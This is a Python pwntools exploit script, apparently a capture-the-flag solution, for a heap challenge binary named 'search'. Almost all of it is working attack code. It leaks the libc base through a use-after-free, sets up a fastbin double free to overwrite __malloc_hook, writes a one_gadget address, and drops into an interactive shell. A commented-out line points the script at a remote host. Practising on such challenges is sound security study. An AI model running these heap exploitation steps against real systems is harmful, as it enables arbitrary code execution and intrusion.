# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
name = './search'
r = process(name)

#libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

# Added sentence
# 1: Search with a word
# 2: Index a sentence
# 3: Quit
# 2
# Enter the sentence size:
# 1
# Enter the sentence:
# 1
# Added sentence
# 1: Search with a word
# 2: Index a sentence
# 3: Quit
# 1
# Enter the word size:
# 1
# Enter the word:
# a
print(str(r.proc.pid))
def go():
    r.recv(timeout=0.1)
    gdb.attach(r, """
    bins
    x/50gx 0x604010
    echo "wordlist:\\n
    x/1gx 0x06020B8
    echo "__malloc_hook:\\n
     x/10gx 0x7ffff7dd1b20-0x33
     echo "__malloc_hook:\\n
     x/10gx &__malloc_hook

    """);
    print(str(r.proc.pid))
def index(sentence):
    r.recvuntil("3: Quit\n")
    r.sendline('2')
    r.recvuntil('Enter the sentence size:\n')
    r.sendline(str(len(sentence)))
    r.recvuntil('Enter the sentence:\n')
    r.send(sentence)

def search(word, kill):
    r.recvuntil("3: Quit\n")
    r.sendline('1')
    r.recvuntil('Enter the word size:\n')
    r.sendline(str(len(word)))
    r.recvuntil('Enter the word:\n')
    r.send(word)
    # if kill == 'y' or kill == 'n':
    r.recvuntil('Delete this sentence (y/n)?')
    r.sendline(kill) # 'y/n'
    # r.sendline('n')

# 1. leak libc

index("A"*200+" A AA")

index("BBB")
index("CCC")

search("BBB",'y')
search("A"*200,'y')

# search("\x00\x00", False)
r.sendline('1')
r.sendline('1')
r.recvuntil('Enter the word:\n')
r.send('\x00\x00')

# print('xx',r.recv(11))
r.recv(11)
raw=u64(r.recv(8).ljust(8,'\x00'))
libc_base = raw -  0x3c4c48
print('libc_base: ', hex(libc_base))
r.sendline('n')

index("J"*200) # clean up
index("J")
# 2. fastbin attack

index("A"*0x60+"A A1")
index("B"*0x60+"B B1B")
index("C"*0x60+"C C1")

search("A1",'y')
search("B1B",'y')
# r.sendline('y')
search("C1",'y')

search("\x00"*3, 'y') ## double free setup

target = 0x3c4aed + libc_base #  0x7ffff7dd1aed 

index(p64(target)+"A"*0x60)
index("A"*0x61)
index("B"*0x61)
index("A FUCK")
search("FUCK", 'y')
# go()
# pause()
# index("C"*0x61)
# 0x45216,0x4526a ,0xf02a4,0xf1147
one_gadget = libc_base +0xf02a4
payload = ''
payload += 0x13*'C'
payload += p64(one_gadget)
payload=payload.ljust(0x61,"A")
index(payload)

# go()
print(str(r.proc.pid))
r.interactive()

